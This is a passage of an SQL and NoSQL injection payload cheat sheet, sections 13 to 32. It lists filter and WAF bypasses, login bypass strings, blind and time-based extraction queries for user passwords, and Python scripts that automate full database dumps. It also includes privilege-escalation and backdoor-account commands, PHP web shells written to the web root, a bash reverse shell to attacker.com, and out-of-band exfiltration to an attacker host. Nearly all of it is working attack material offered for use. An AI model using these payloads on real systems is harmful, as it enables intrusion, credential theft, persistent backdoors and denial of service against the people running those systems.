UnIoN SeLeCt 1,2,3
UNion SELect 1,2,3

-- Random case with comments
UnI/**/oN SeL/**/eCt 1,2,3
/_!50000UnIoN_/ /_!50000SeLeCt_/ 1,2,3

-- MySQL version comments
/_!40101 UNION_/ /_!40101 SELECT_/ 1,2,3
/_!50000UNION_/ /_!50000SELECT_/ 1,2,3
/_!50001UNION_/ /_!50002SELECT_/ 1,2,3

-- Nested comments
/_!UN/_!ION*/ SELECT*/ 1,2,3
/_!50000UN/_!50000ION*/ SELECT*/ 1,2,3

-- Inline comment variations
/**/OR/**/1=1
/_!OR_/1=1
/_!50000OR_/1=1
/**_/OR/_**/1=1

-- Random comment insertion
U/_a_/N/_b_/I/_c_/O/_d_/N S/_e_/E/_f_/L/_g_/E/_h_/C/_i_/T

-- Whitespace alternatives
%20 (space)
%09 (tab)
%0a (newline)
%0b (vertical tab)
%0c (form feed)
%0d (carriage return)
%a0 (non-breaking space)
%00 (null byte)

-- Whitespace combinations
%09%0a%0b%0c%0d
%0a%09%0d%20%0b
%0d%0a%20%09%0c

-- No whitespace techniques
OR(1=1)
OR(1)=1
OR'1'='1'
OR''=''
OR(1)='1'
OR'1'=1

-- Parentheses stacking
(((OR(((1=1))))))
((((((1=1))))))
((1)=(1))

-- Line break injection
'
OR
1=1
--

#

\
OR
\
1=1
--

-- SQL injection through JSON
{"username": "admin' OR 1=1--", "password": "anything"}
{"username": {"$ne": null}, "password": {"$regex": "^."}}
{"$or": [{"username": "admin"}, {"password": {"$regex": "^."}}]}

-- SQL injection through XML
<user><username>admin' OR 1=1--</username><password>test</password></user>
<user><username><![CDATA[admin' OR 1=1--]]></username><password>test</password></user>

-- SQL injection through HTTP headers
User-Agent: ' OR 1=1--
X-Forwarded-For: ' OR 1=1--
Referer: ' OR 1=1--
Cookie: session=' OR 1=1--
Accept-Language: ' OR 1=1--

<!--
[13] WHITESPACE & SYNTAX BYPASS - COMPLETE
-->

-- Alternative whitespace characters (ASCII)
%01 (SOH), %02 (STX), %03 (ETX), %04 (EOT), %05 (ENQ)
%06 (ACK), %07 (BEL), %08 (BS), %0e (SO), %0f (SI)
%10 (DLE), %11 (DC1), %12 (DC2), %13 (DC3), %14 (DC4)
%15 (NAK), %16 (SYN), %17 (ETB), %18 (CAN), %19 (EM)
%1a (SUB), %1b (ESC), %1c (FS), %1d (GS), %1e (RS), %1f (US)

-- Alternative whitespace (Unicode)
%c2%a0 (NO-BREAK SPACE)
%e1%a0%8e (MONGOLIAN VOWEL SEPARATOR)
%e2%80%80 (EN QUAD)
%e2%80%81 (EM QUAD)
%e2%80%82 (EN SPACE)
%e2%80%83 (EM SPACE)
%e2%80%84 (THREE-PER-EM SPACE)
%e2%80%85 (FOUR-PER-EM SPACE)
%e2%80%86 (SIX-PER-EM SPACE)
%e2%80%87 (FIGURE SPACE)
%e2%80%88 (PUNCTUATION SPACE)
%e2%80%89 (THIN SPACE)
%e2%80%8a (HAIR SPACE)
%e2%80%8b (ZERO WIDTH SPACE)
%e2%80%8c (ZERO WIDTH NON-JOINER)
%e2%80%8d (ZERO WIDTH JOINER)
%ef%bb%bf (ZERO WIDTH NO-BREAK SPACE)

-- Alternative parentheses
( ) [ ] { } < >
%28 %29 %5b %5d %7b %7d %3c %3e

-- Alternative quotes
' (U+0027)
" (U+0022)
` (U+0060)
´ (U+00B4)
′ (U+2032)
″ (U+2033)
‴ (U+2034)
＇ (U+FF07)
＂ (U+FF02)

-- Alternative logical operators
AND -> && (MySQL)
OR -> || (MySQL, PostgreSQL)
NOT -> ! (MySQL)
AND -> & (bitwise)
OR -> | (bitwise)
XOR -> ^ (bitwise)

-- Alternative comparison operators
= -> LIKE
= -> REGEXP
= -> RLIKE
= -> IN
= -> BETWEEN
<> -> NOT LIKE
<> -> NOT REGEXP
<> -> NOT IN

-- Alternative string concatenation
CONCAT() -> CONCAT_WS() -> GROUP_CONCAT()
|| (PostgreSQL, Oracle)

- (MSSQL)
  CONCAT() (MySQL)

<!--
[14] KEYWORD FILTER BYPASS - ULTIMATE
-->

-- Double keywords
UNION UNION SELECT SELECT 1,2
AND AND 1=1
OR OR 1=1

-- Keyword splitting with comments
UN/**/ION SEL/**/ECT
UN/_!_/ION/_!_/SELECT
UN/_!50000ION_/SELECT

-- Keyword splitting with newlines
UN%0aION%0aSELECT
UN%0dION%0dSELECT
UN%0a%0dION%0a%0dSELECT

-- Keyword splitting with null bytes
UN%00ION SEL%00ECT
%00UNION%00SELECT%00

-- Keyword reversal (if app reverses string)
NOITCELES NOINU
1,2 TCELES NOINU

-- Keyword character substitution
UN10N S3L3CT
UN1ON SEL3CT
UN[ON SEL[ECT

-- Keyword encoding
%55%4E%49%4F%4E %53%45%4C%45%43%54
\x55\x4E\x49\x4F\x4E \x53\x45\x4C\x45\x43\x54

-- Keyword with hex
0x554E494F4E 0x53454C454354

-- Alternative keywords (MySQL)
DATABASE() -> SCHEMA()
USER() -> CURRENT_USER(), SESSION_USER(), SYSTEM_USER()
VERSION() -> @@VERSION
CONCAT() -> CONCAT_WS()

-- Alternative keywords (PostgreSQL)
DATABASE() -> CURRENT_DATABASE()
USER() -> CURRENT_USER, SESSION_USER
VERSION() -> VERSION()

-- Alternative keywords (MSSQL)
DATABASE() -> DB_NAME()
USER() -> SYSTEM_USER, SUSER_NAME()
VERSION() -> @@VERSION

<!--
[15] ADVANCED CHAINED PAYLOADS - REAL WORLD SCENARIOS
-->

-- Scenario 1: Login bypass with time-based detection
' OR IF(1=1, SLEEP(5), 0) AND '1'='1

-- Scenario 2: Union + Error-based extraction
' UNION SELECT 1,2,3 AND EXTRACTVALUE(1, CONCAT(0x7e,(SELECT database()),0x7e))--

-- Scenario 3: Boolean blind + OOB exfiltration
' AND IF((SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\a'))),1,0) AND '1'='1

-- Scenario 4: Time-based + File write
' AND IF((SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/html/shell.php'), SLEEP(5), 0)--

-- Scenario 5: Multi-stage extraction chain
-- Stage 1: Get database name
' UNION SELECT database(),2,3--
-- Stage 2: Get table names
' UNION SELECT GROUP_CONCAT(table_name),2 FROM information_schema.tables WHERE table_schema='db'--
-- Stage 3: Get column names
' UNION SELECT GROUP_CONCAT(column_name),2 FROM information_schema.columns WHERE table_name='users'--
-- Stage 4: Extract data
' UNION SELECT GROUP_CONCAT(CONCAT_WS(':',username,password)),2 FROM users--

-- Scenario 6: WAF bypass chain
%27%20%55%6E%49%6F%6E%20%53%45%4C%45%43%54%20%31%2C%32%2C%33%2D%2D%20

-- Scenario 7: Blind boolean with binary search
' AND ASCII(SUBSTRING(database(),1,1)) > 64--
' AND ASCII(SUBSTRING(database(),1,1)) > 96--
' AND ASCII(SUBSTRING(database(),1,1)) > 112--
' AND ASCII(SUBSTRING(database(),1,1)) > 120--

-- Scenario 8: Time-based binary extraction
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 64, SLEEP(5), 0)--
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 96, SLEEP(5), 0)--

-- Scenario 9: Error-based with union fallback
' AND EXTRACTVALUE(1, CONCAT(0x7e,(SELECT GROUP_CONCAT(username,':',password) FROM users),0x7e)) UNION SELECT 1,2,3,4,5,6,7,8,9,10--

-- Scenario 10: Full database dump (time-based)
-- Extract database name
' AND IF(ASCII(SUBSTRING(database(),1,1))={char}, SLEEP(5), 0)--
-- Extract table count
' AND IF((SELECT COUNT(\*) FROM information_schema.tables WHERE table_schema=database())={count}, SLEEP(5), 0)--
-- Extract table names
' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {offset},1),{pos},1))>{char}, SLEEP(5), 0)--
-- Extract column names
' AND IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT {offset},1),{pos},1))>{char}, SLEEP(5), 0)--
-- Extract data
' AND IF(ASCII(SUBSTRING((SELECT {column} FROM {table} LIMIT {row},1),{pos},1))>{char}, SLEEP(5), 0)--

<!--
[16] MEMORY & PERFORMANCE ATTACKS
-->

-- Heavy queries (DoS)
AND (SELECT COUNT(_) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C, information_schema.columns D) > 0
AND (SELECT COUNT(_) FROM generate_series(1,10000000)) > 0-- (PostgreSQL)
AND (SELECT COUNT(\*) FROM sys.objects A, sys.objects B, sys.objects C, sys.objects D, sys.objects E) > 0-- (MSSQL)

-- Recursive CTE (MSSQL, PostgreSQL)
;WITH RECURSIVE cte(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM cte WHERE n < 1000000) SELECT COUNT(\*) FROM cte

-- Cartesian product attacks
AND (SELECT COUNT(\*) FROM users u1, users u2, users u3, users u4) > 0

-- Infinite loops (if supported)
;WHILE 1=1 BEGIN SELECT 1 END--
;DECLARE @i INT = 0; WHILE @i < 1000000000 BEGIN SET @i = @i + 1 END--

<!--
[17] SECOND-ORDER SQL INJECTION
-->

-- Registration payload (stored, triggered later)
INSERT INTO users (username, password) VALUES ('admin' OR 1=1--', 'pass')
UPDATE users SET password='newpass' WHERE username='admin' OR 1=1--'

-- Stored procedure injection
' OR 1=1; EXEC sp_helptext 'sp_name'--
' OR 1=1; DROP PROCEDURE sp_name--

-- Trigger-based injection
' OR 1=1; CREATE TRIGGER backdoor AFTER INSERT ON users FOR EACH ROW BEGIN INSERT INTO admin VALUES('hacker','pass'); END;--

<!--
[18] NO-SQL INJECTION (MongoDB, etc.)
-->

-- MongoDB authentication bypass
{"$ne": null}
{"$gt": ""}
{"$regex": "^.*$"}
{"$or": []}
{"$where": "1==1"}

-- MongoDB operator injection
username[$ne]=admin&password[$ne]=anything
username[$regex]=._&password[$regex]=._

-- MongoDB JavaScript injection
{"$where": "this.username == 'admin' && this.password.match(/.*/)"}
{"$where": "function() { return this.username == 'admin' || 1==1 }"}

-- MongoDB data extraction
{"$where": "Object.keys(this)[0] == 'username'"}
{"$where": "this.username.match(/^a/) ? true : false"}

<!--
[19] NOSQL (Cassandra, CouchDB, etc.)
-->

-- Cassandra injection
' OR 1=1 ALLOW FILTERING--
' AND password = '' OR ''='

-- CouchDB injection
/\_design/example/\_view/total?key="admin' OR '1'='1"
/\_design/example/\_view/total?startkey="admin"&endkey="admin\u9999"

<!--
[20] AUTOMATION SCRIPTS - COMPLETE EXAMPLES
-->

-- Python boolean blind automation

```python
import requests
import string

url = "http://target.com/vuln.php"
param = "id"

def inject(query):
    # Your injection logic here
    pass

def extract_database():
    db_name = ""
    for position in range(1, 20):
        for char in string.ascii_lowercase + string.digits + '_':
            payload = f"' AND SUBSTRING(database(),{position},1)='{char}'--"
            if inject(payload):
                db_name += char
                print(f"Found: {db_name}")
                break
        else:
            break
    return db_name

def extract_table_names():
    tables = []
    for table_index in range(10):
        table_name = ""
        for position in range(1, 50):
            for char in string.ascii_lowercase + string.digits + '_':
                payload = f"' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {table_index},1),{position},1)='{char}'--"
                if inject(payload):
                    table_name += char
                    break
            else:
                if table_name:
                    tables.append(table_name)
                break
    return tables

def extract_columns(table_name):
    columns = []
    for col_index in range(20):
        column_name = ""
        for position in range(1, 50):
            for char in string.ascii_lowercase + string.digits + '_':
                payload = f"' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {col_index},1),{position},1)='{char}'--"
                if inject(payload):
                    column_name += char
                    break
            else:
                if column_name:
                    columns.append(column_name)
                break
    return columns

def extract_data(table, columns):
    data = []
    for row_index in range(100):
        row_data = {}
        for column in columns:
            value = ""
            for position in range(1, 200):
                for char in string.printable:
                    payload = f"' AND SUBSTRING((SELECT {column} FROM {table} LIMIT {row_index},1),{position},1)='{char}'--"
                    if inject(payload):
                        value += char
                        break
                else:
                    if value:
                        row_data[column] = value
                    break
        if row_data:
            data.append(row_data)
        else:
            break
    return data

# Run extraction
db = extract_database()
print(f"Database: {db}")
tables = extract_table_names()
print(f"Tables: {tables}")
for table in tables:
    cols = extract_columns(table)
    print(f"Columns in {table}: {cols}")
    data = extract_data(table, cols)
    print(f"Data in {table}: {data}")

-- Python time-based automation
import requests
import time
import string

def time_based_inject(payload):
    start = time.time()
    response = requests.get(url, params={param: payload})
    elapsed = time.time() - start
    return elapsed > 5  # Assuming 5 second delay

def extract_with_time(query, position):
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        payload = f"' AND IF(ASCII(SUBSTRING(({query}),{position},1)) > {mid}, SLEEP(5), 0)--"
        if time_based_inject(payload):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low) if low <= 126 else None

def extract_string(query, max_length=100):
    result = ""
    for pos in range(1, max_length+1):
        char = extract_with_time(query, pos)
        if char and char != '\x00':
            result += char
        else:
            break
    return result

# Usage
database = extract_string("SELECT database()")
print(f"Database: {database}")
version = extract_string("SELECT VERSION()")
print(f"Version: {version}")

-- Burp Intruder payload generation (Python)
# Generate payloads for Burp Intruder
def generate_union_payloads(min_cols=1, max_cols=20):
    for cols in range(min_cols, max_cols+1):
        yield f"' UNION SELECT {','.join(['NULL']*cols)}--"
        yield f"' UNION SELECT {','.join([str(i) for i in range(1, cols+1)])}--"

def generate_blind_payloads(table, column, row=0, pos=1, char_start=32, char_end=126):
    for char in range(char_start, char_end+1):
        yield f"' AND ASCII(SUBSTRING((SELECT {column} FROM {table} LIMIT {row},1),{pos},1)) = {char}--"

def generate_time_payloads(query, pos=1, char_start=32, char_end=126):
    for char in range(char_start, char_end+1):
        yield f"' AND IF(ASCII(SUBSTRING(({query}),{pos},1)) = {char}, SLEEP(5), 0)--"

# Generate wordlist for common table names
common_tables = ['users', 'user', 'admin', 'accounts', 'members', 'login', 'credentials', 'passwords', 'tbl_users', 'wp_users']
for table in common_tables:
    yield f"' AND (SELECT COUNT(*) FROM {table}) > 0--"

# Generate column name bruteforce
common_columns = ['username', 'password', 'user', 'pass', 'email', 'id', 'name', 'login', 'pwd', 'passwd', 'user_id']
for col in common_columns:
    yield f"' AND (SELECT {col} FROM users LIMIT 1) IS NOT NULL--"

<!-- [21] DATABASE FINGERPRINTING PAYLOADS -->
-- MySQL fingerprinting
' AND @@version LIKE '%MySQL%'--
' AND VERSION() LIKE '%Maria%'--
' AND @@version_compile_os LIKE '%linux%'--

-- PostgreSQL fingerprinting
' AND VERSION() LIKE '%PostgreSQL%'--
' AND current_setting('server_version') LIKE '%12%'--

-- MSSQL fingerprinting
' AND @@VERSION LIKE '%Microsoft%'--
' AND @@VERSION LIKE '%2019%'--
' AND SERVERPROPERTY('Edition') LIKE '%Enterprise%'--

-- Oracle fingerprinting
' AND banner FROM v$version LIKE '%Oracle%'--
' AND global_name LIKE '%ORA%'--

-- SQLite fingerprinting
' AND sqlite_version() LIKE '%3%'--

<!-- [22] WAF DETECTION & EVASION TECHNIQUES -->
-- WAF detection payloads
' OR 1=1-- (simple)
' OR 1=1 AND 1=1--
' OR '1'='1'--
' UNION SELECT 1,2,3--
' AND SLEEP(5)--
' AND 1/0--

-- WAF fingerprinting by response
-- 403 Forbidden = WAF blocking
-- 406 Not Acceptable = ModSecurity
-- 500 Internal Error = Application error
-- 302 Redirect = Possible WAF
-- Connection reset = Cloudflare/CloudFront

-- WAF bypass by splitting payload across parameters
param1=1'&param2=OR&param3=1=1--
param1=admin'&param2=UNION&param3=SELECT&param4=1,2,3--

-- WAF bypass by HTTP parameter pollution
?id=1&id=1' OR 1=1--
?id=1&id=2' UNION SELECT 1,2,3--

-- WAF bypass by HTTP method
GET /vuln.php?id=1' OR 1=1-- (GET)
POST /vuln.php (with POST body containing injection)

-- WAF bypass by content-type
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data; boundary=xxx
Content-Type: application/json

-- WAF bypass by encoding
Accept-Encoding: gzip, deflate, br (compressed response)

-- WAF bypass by IP reputation (use proxies)
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
Client-IP: 127.0.0.1

-- WAF bypass by user-agent spoofing
User-Agent: Mozilla/5.0 (Googlebot/2.1; +http://www.google.com/bot.html)
User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)

<!-- [23] RACE CONDITION & TIMING ATTACKS -->
-- Race condition (if multiple requests)
'; UPDATE users SET password='hacked' WHERE username='admin' WAITFOR DELAY '0:0:1'--
'; INSERT INTO logs SELECT SLEEP(5) FROM users--

-- Timing attack on comparison
' AND password = 'admin' AND SLEEP(5)--
' AND password LIKE 'a%' AND SLEEP(5)--
' AND SUBSTRING(password,1,1) = 'a' AND SLEEP(5)--

<!-- [24] STORED PROCEDURE INJECTION -->
-- MySQL stored procedure
' OR 1=1; CALL mysql.rds_kill(12345);--
' OR 1=1; CALL mysql.rds_set_configuration('binlog retention hours', 24);--

-- MSSQL stored procedure
' OR 1=1; EXEC xp_cmdshell 'whoami';--
' OR 1=1; EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion', 'ProductName';--
' OR 1=1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
' OR 1=1; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--

-- Oracle stored procedure
' OR 1=1; EXECUTE IMMEDIATE 'CREATE TABLE backdoor AS SELECT * FROM users';--
' OR 1=1; BEGIN DBMS_SCHEDULER.CREATE_JOB(...); END;--

<!-- [25] ADVANCED METADATA QUERIES -->
-- Find all tables with sensitive keywords
SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%user%' OR table_name LIKE '%admin%' OR table_name LIKE '%pass%' OR table_name LIKE '%cred%' OR table_name LIKE '%login%' OR table_name LIKE '%member%' OR table_name LIKE '%account%'

-- Find all columns with sensitive keywords
SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%user%' OR column_name LIKE '%pass%' OR column_name LIKE '%email%' OR column_name LIKE '%phone%' OR column_name LIKE '%address%' OR column_name LIKE '%credit%' OR column_name LIKE '%card%'

-- Find all tables with foreign keys
SELECT table_name, constraint_name, referenced_table_name FROM information_schema.referential_constraints

-- Find all views
SELECT table_name FROM information_schema.tables WHERE table_type='VIEW'

-- Find all indexes
SELECT table_name, index_name FROM information_schema.statistics

-- Find all triggers (MySQL)
SELECT trigger_name, event_object_table FROM information_schema.triggers

-- Find all functions
SELECT routine_name, routine_type FROM information_schema.routines

<!-- [26] DATABASE LINK & FEDERATED QUERIES -->
-- MySQL federated engine
' UNION SELECT * FROM federated_table--
' CREATE SERVER fed FOREIGN DATA WRAPPER mysql OPTIONS (HOST 'attacker.com', DATABASE 'db', USER 'user', PASSWORD 'pass');--

-- PostgreSQL dblink
' SELECT * FROM dblink('host=attacker.com user=postgres dbname=postgres', 'SELECT usename, passwd FROM pg_shadow') AS t1(u name, p text);--

-- MSSQL linked server
' SELECT * FROM OPENQUERY([linked_server], 'SELECT name FROM master..sysdatabases');--

<!-- [27] CRYPTOGRAPHIC ATTACKS (Context-specific) -->
-- Hash length extension (if MD5/SHA1 used)
' AND MD5(CONCAT(secret, 'admin')) = 'known_hash'--

-- SQL injection into cryptographic functions
' UNION SELECT AES_DECRYPT(password, 'key') FROM users--
' UNION SELECT UNCOMPRESS(password) FROM users--

<!-- [28] PRIVILEGE ESCALATION PAYLOADS -->
-- MySQL privilege escalation
' OR 1=1; GRANT ALL PRIVILEGES ON . TO 'user'@'%' WITH GRANT OPTION;--
' OR 1=1; CREATE USER 'hacker'@'%' IDENTIFIED BY 'pass'; GRANT ALL PRIVILEGES ON . TO 'hacker'@'%';--

-- PostgreSQL privilege escalation
' OR 1=1; ALTER ROLE postgres WITH SUPERUSER;--
' OR 1=1; CREATE ROLE hacker WITH LOGIN SUPERUSER PASSWORD 'pass';--

-- MSSQL privilege escalation
' OR 1=1; EXEC sp_addsrvrolemember 'hacker', 'sysadmin';--
' OR 1=1; EXEC sp_addrole 'db_owner', 'hacker';--

<!-- [29] PERSISTENCE TECHNIQUES -->
-- Web shell via SQL injection (if file write possible)
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT '<?php eval($_POST["c"]); ?>' INTO DUMPFILE '/var/www/html/shell.php'--

-- Reverse shell via SQL injection
' UNION SELECT '<?php exec("/bin/bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\""); ?>' INTO OUTFILE '/var/www/html/rev.php'--

-- Database backdoor (trigger-based)
' OR 1=1; CREATE TRIGGER backdoor BEFORE INSERT ON users FOR EACH ROW BEGIN INSERT INTO admin VALUES('hacker','pass'); END;--

-- Scheduled job (MSSQL)
' OR 1=1; EXEC msdb.dbo.sp_add_job @job_name='backdoor'; EXEC msdb.dbo.sp_add_jobstep @job_name='backdoor', @step_name='cmd', @command='xp_cmdshell "net user hacker pass /add"'; EXEC msdb.dbo.sp_add_jobserver @job_name='backdoor';--

<!-- [30] LEGACY & OBSOLETE DATABASE PAYLOADS -->
-- MySQL < 5.0 (no information_schema)
' UNION SELECT 1,2,3 FROM mysql.user--
' UNION SELECT user,password FROM mysql.user--
' UNION SELECT db,user,password FROM mysql.db--

-- MSSQL 2000
' UNION SELECT name FROM sysobjects WHERE xtype='U'--
' UNION SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')--

-- Oracle 9i
' UNION SELECT table_name FROM all_tables--
' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--

<!-- [31] EMERGING TECHNIQUES (2023-2024) -->
-- GraphQL injection (through SQLi)
{"query": "query { user(id: "1' OR 1=1--") { name password } }"}

-- gRPC injection (protobuf)
payload = b'\x0a\x0b\x31\x27\x20\x4f\x52\x20\x31\x3d\x31\x2d\x2d'

-- HTTP/2 specific bypasses (case normalization)
:path: /vuln.php?id=1%27%20OR%201=1--

-- WebSocket injection
ws.send("1' OR 1=1--")

-- Serverless function injection (AWS Lambda, etc.)
event['queryStringParameters']['id'] = "1' OR 1=1--"

-- GraphQL batch query injection
[
{"query": "query { user(id: "1") { name } }"},
{"query": "query { user(id: "2' OR 1=1--") { password } }"}
]

<!-- [32] PHYSICAL DATABASE ATTACKS (Advanced) -->
-- Large object allocation (DoS)
' UNION SELECT REPEAT('A', 100000000) INTO DUMPFILE '/dev/null'--
' UNION SELECT GENERATE_SERIES(1,100000000) INTO OUTFILE '/dev/null'--

-- Transaction log flooding
' OR 1=1; BEGIN TRANSACTION; INSERT INTO logs SELECT * FROM logs; COMMIT;--

-- Temp table explosion
' OR 1=1; CREATE TEMPORARY TABLE temp AS SELECT * FROM users, users u2, users u3;--

```
